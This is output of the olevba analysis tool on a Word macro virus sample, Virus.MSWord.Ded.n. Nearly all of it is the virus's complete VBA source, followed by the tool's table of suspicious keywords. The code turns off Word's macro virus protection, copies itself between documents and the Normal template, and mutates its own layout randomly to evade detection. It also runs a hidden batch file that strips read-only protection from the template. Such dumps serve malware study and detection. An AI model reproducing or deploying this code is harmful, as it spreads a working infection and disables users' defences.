olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.n-e72200c7a09ac35029e145cda1ef54af7cf0dc1b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.n-e72200c7a09ac35029e145cda1ef54af7cf0dc1b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_Close()

         On Error GoTo _
skam

    Options.VirusProtection _
= False

    SWL
'40.13744
          ABS99
'41.27668
skam:
'58.3359
         End Sub
'91.93771
   Private Sub Èäåíòèôèêàòîð()
'47.44592
 End Sub
'39.04715
           Private Sub Document_New()
'8.964139
  End Sub
'58.97926
     Private Sub SWL()
'25.46019
              Application. _
                                                          ShowVisualBasicEditor = False

     If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             For I = _
1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While _
Mid(d, Len(d) - 1, 2) = " _"

     I = I + 1
'58.45293
  d _
= Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'78.21387
 d = e(d)
'46.3584
          ActiveDocument. _
                               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'80.25874
              Next _
I

  ActiveDocument. _
                                            SaveAs AddToRecentFiles:=False

          End If
'44.11147
  End _
Sub

Private Sub ABS99()
'40.16046
      If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             f (NormalTemplate. _
FullName)

            For I = 1 To _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 d _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

             If Len(d) > 0 _
And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - _
1, 2) = " _"

  I = I _
+ 1

  d = Left(d, Len(d) _
- 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'72.94109
            d = e(d)
'55.51133
            NormalTemplate. _
            VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'33.90907
    Next _
I

           NormalTemplate. _
                            Save

     End If
'28.13814
       End Sub
'26.80438
    Private Function e(aString) As _
String

aString = LTrim(aString)
'96.4709
    aString _
= RTrim(aString)

            If aString _
= "Sub " & "Vc()" Then

aString = "Sub " & "ViewVBCode()"
'13.9438
  Else
'42.49291
 If aString _
= "Sub " & "ViewVBCode()" Then

  aString _
= "Sub " & "Vc()"

            End If
'30.66294
      End If
'49.33584
         For I = 1 _
To Len(aString) - 1

              If Mid(aString, _
I, 1) = "." Then

If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

  If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

 e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

     For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'46.8736
        Next j
'80.70413
   Exit Function
'32.68447
         End If
'58.99297
    End If
'58.3927
Else
'38.75368
              If _
Mid(aString, I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

          If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e = Left(aString, _
I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

            For _
j = 1 To Int(15 * Rnd)

         e = " " & _
e

     Next j
'29.1052
      Exit Function
'76.98775
        End If
'17.76208
 End If
'43.15423
 End _
If

       Next I
'41.63005
      e _
= aString & Chr$(13) & "'" & (100 * Rnd)

     Count _
= Int(15 * Rnd)

        For _
j = 1 To Count

        e _
= " " & e

   Next j
'76.01295
          End Function
'27.8411
          Private _
Sub f(fName)

   If GetAttr(fName) And vbReadOnly Then
'95.71298
Open Dir(fName) _
& ".bat" For Append As #1

             Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

  Close _
#1

            shellResult = Shell(Dir(fName) & ".bat", vbHide)
'86.16203
End If
'27.48487
     End _
Sub

      Private Sub Document_Open()
'31.58559
End Sub
'78.03816
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

